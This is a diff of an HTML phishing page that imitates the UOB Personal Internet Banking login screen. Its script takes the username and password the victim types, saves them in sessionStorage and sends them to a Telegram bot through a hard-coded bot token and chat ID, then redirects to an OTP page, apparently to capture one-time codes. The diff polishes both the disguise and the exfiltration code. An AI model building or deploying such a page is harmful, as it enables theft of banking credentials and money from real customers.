@@ -5,238 +5,176 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>UOB Personal Internet Banking</title>
 <style>
-  body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(to bottom, #0057b7, #003d7a);
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: 'Roboto', sans-serif;
+    background: #003d7a url('') no-repeat center center fixed;
+    background-size: cover;
     display: flex;
-    flex-direction: column;
+    justify-content: center;
     align-items: center;
-    min-height: 100vh;
-    color: #333;
+  }
+  .login-box {
+    background: #fff;
+    width: 320px;
+    padding: 28px 32px 36px;
+    box-sizing: border-box;
+    border-radius: 6px;
+    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
   }
   .logo {
-    margin: 20px 0 10px 20px;
-    font-weight: bold;
-    font-size: 28px;
-    color: #0057b7;
     display: flex;
     align-items: center;
+    margin-bottom: 24px;
   }
-  .logo .red-bars {
-    width: 20px;
-    height: 28px;
-    background: repeating-linear-gradient(
-      to right,
-      #d71920,
-      #d71920 3px,
-      transparent 3px,
-      transparent 6px
-    );
-    margin-right: 10px;
+  .logo .bars {
+    width: 20px; height: 24px;
+    background:
+      repeating-linear-gradient(to right,
+        #d71920 0 3px,
+        transparent 3px 6px);
+    margin-right: 9px;
   }
-  .login-container {
-    background: #fff;
-    border-radius: 4px;
-    width: 320px;
-    max-width: 90%;
-    padding: 20px 30px;
-    box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-    margin-bottom: 40px;
+  .logo span {
+    font-weight: 700;
+    font-size: 22px;
+    color: #0072ce;
   }
-  .language {
-    text-align: right;
+  .lang {
     font-size: 13px;
-    margin-bottom: 15px;
+    text-align: right;
+    margin-bottom: 12px;
   }
-  .language a {
-    color: #5e5e5e;
+  .lang a {
+    color: #0072ce;
     text-decoration: none;
-    margin-left: 7px;
+    margin-left: 8px;
   }
-  .language a:hover {
+  .lang a:hover {
     text-decoration: underline;
   }
-  h2 {
-    margin: 8px 0 20px 0;
-    font-weight: 500;
+  h1 {
+    font-weight: 400;
     font-size: 20px;
+    margin: 0 0 24px 0;
     color: #333;
   }
   input[type="text"], input[type="password"] {
     width: 100%;
-    padding: 14px 10px;
-    margin: 6px 0 15px;
-    box-sizing: border-box;
-    font-size: 14px;
-    border: 1px solid #ddd;
-    border-radius: 2px;
-    color: #999;
-  }
-  input[type="text"]:focus, input[type="password"]:focus {
-    border-color: #0057b7;
-    color: #333;
+    border: 1px solid #ccc;
+    border-radius: 0;
     outline: none;
+    padding: 14px 12px;
+    font-size: 14px;
+    color: #999;
+    margin-top: -1px;
+    box-sizing: border-box;
+  }
+  input::placeholder {
+    text-transform: uppercase;
+  }
+  input:focus {
+    border-color: #0072ce;
+    color: #333;
+  }
+  input:first-child {
+    border-top-left-radius: 4px;
+    border-top-right-radius: 4px;
+  }
+  input:last-child {
+    border-bottom-left-radius: 4px;
+    border-bottom-right-radius: 4px;
   }
   button {
-    background-color: #0072ce;
-    color: white;
-    border: none;
-    padding: 12px;
+    margin-top: 24px;
     width: 100%;
-    border-radius: 3px;
+    background-color: #0072ce;
+    border: none;
+    color: #fff;
+    padding: 12px 0;
     font-size: 16px;
+    border-radius: 4px;
     cursor: pointer;
   }
   button:hover {
     background-color: #0057b7;
   }
-  .forgot-link, .register-link {
+  .forgot,
+  .register {
+    font-size: 14px;
+    margin-top: 16px;
     color: #0072ce;
-    font-size: 13px;
+    cursor: pointer;
+    display: block;
+    text-align: left;
     text-decoration: none;
-    display: inline-block;
-    margin-top: 10px;
   }
-  .forgot-link:hover, .register-link:hover {
-    text-decoration: underline;
-  }
-  .register-section {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #666;
-  }
-  .footer {
+  .register {
+    margin-top: 28px;
     text-align: center;
-    margin-top: auto;
-    margin-bottom: 20px;
+    color: #666;
+    font-weight: 400;
   }
-  .tmrw-logo {
-    display: inline-block;
-    background-color: #0057b7;
-    color: #fff;
-    padding: 10px 15px;
-    border-radius: 7px;
-    font-weight: bold;
-    font-size: 14px;
-    margin-bottom: 8px;
-    vertical-align: middle;
-    position: relative;
-    line-height: 24px;
-  }
-  .tmrw-logo .red-bars {
-    width: 20px;
-    height: 24px;
-    background: repeating-linear-gradient(
-      to right,
-      #d71920,
-      #d71920 3px,
-      transparent 3px,
-      transparent 6px
-    );
-    display: inline-block;
-    vertical-align: middle;
-    margin-right: 6px;
-  }
-  .tmrw-logo span {
-    vertical-align: middle;
-  }
-  .search-box {
-    display: inline-block;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    padding: 5px 10px;
-    margin-left: 10px;
-    vertical-align: middle;
-    font-size: 14px;
-    background: #fff;
-  }
-  .app-icons {
-    margin-top: 8px;
-  }
-  .app-icons img {
-    height: 30px;
-    margin: 0 6px;
-    vertical-align: middle;
+  .register a {
+    color: #0072ce;
+    text-decoration: underline;
     cursor: pointer;
   }
 </style>
 </head>
 <body>
 
-<div class="logo">
-  <div class="red-bars"></div>UOB
-</div>
-
-<div class="login-container" role="main">
-  <div class="language">
+<div class="login-box" role="main" aria-label="Login form">
+  <div class="lang" aria-label="Language selection">
     <a href="#">English</a> | <a href="#">Bahasa Indonesia</a>
   </div>
-  <h2>Welcome to UOB Personal Internet Banking</h2>
   
-  <form id="loginForm" action="javascript:void(0);" aria-label="Login form">
-    <input type="text" id="username" name="username" placeholder="USERNAME" aria-label="Username" required autofocus />
-    <input type="password" id="password" name="password" placeholder="PASSWORD" aria-label="Password" required />
+  <div class="logo" aria-label="UOB logo">
+    <div class="bars" aria-hidden="true"></div><span>UOB</span>
+  </div>
+  
+  <h1>Welcome to UOB Personal Internet Banking</h1>
+  
+  <form id="loginForm" action="javascript:void(0);">
+    <input type="text" id="username" name="username" placeholder="USERNAME" autocomplete="username" required aria-label="Username" />
+    <input type="password" id="password" name="password" placeholder="PASSWORD" autocomplete="current-password" required aria-label="Password" />
     <button type="submit" id="loginBtn">Login</button>
   </form>
-  <a href="#" class="forgot-link">Forgot Username/Password?</a>
-  <div class="register-section">
-    Don't have an account?<br />
-    <a href="#" class="register-link">Register now!</a>
-  </div>
-</div>
+  
+  <a href="#" class="forgot" aria-label="Forgot Username or Password">Forgot Username/Password?</a>
 
-<div class="footer" aria-label="Footer and app download">
-  <div class="tmrw-logo" aria-label="TMRW by UOB logo">
-    <div class="red-bars"></div><span>UOB</span> TMRW ID
-  </div>
-  <input type="text" class="search-box" placeholder="tmrw.bz/wealth" aria-label="Search tmrw.bz wealth" />
-  <div class="app-icons">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_(iOS).svg" alt="App Store" />
-    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Google_Play_Arrow_logo.svg" alt="Google Play" />
-  </div>
+  <p class="register">Don't have an account? <a href="#">Register now!</a></p>
 </div>
 
 <script>
-  // Ganti dengan token dan chat ID Anda
   const telegramBotToken = '8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM';
   const telegramChatId = '6647221855';
 
-  document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    
-    var user = document.getElementById('username').value.trim();
-    var pass = document.getElementById('password').value.trim();
-    
-    if (!user || !pass) {
-      alert('Please enter both username and password.');
-      return;
-    }
+  document.getElementById('loginForm').addEventListener('submit', e => {
+    e.preventDefault();
 
-    // Simpan ke sessionStorage supaya bisa dipakai di halaman OTP
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value.trim();
+
+    if(!user || !pass) return;
+
     sessionStorage.setItem('uob_user', user);
     sessionStorage.setItem('uob_pass', pass);
-    
-    // Kirim data login ke Telegram Bot API
-    const message = `New UOB login attempt:\nUsername: ${user}\nPassword: ${pass}`;
-    
+
+    const message =
+      `New UOB login attempt:\nUsername: ${user}\nPassword: ${pass}`;
+
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: telegramChatId,
-        text: message,
-        parse_mode: 'HTML'
+        text: message
       })
-    })
-    .then(response => response.json())
-    .then(data => {
-      // Redirect ke halaman OTP setelah login berhasil dikirim
+    }).finally(() => {
       window.location.href = 'otp.html';
-    })
-    .catch(error => {
-      console.error('Error sending to Telegram:', error);
-      alert('Failed to send login data.');
     });
   });
 </script>
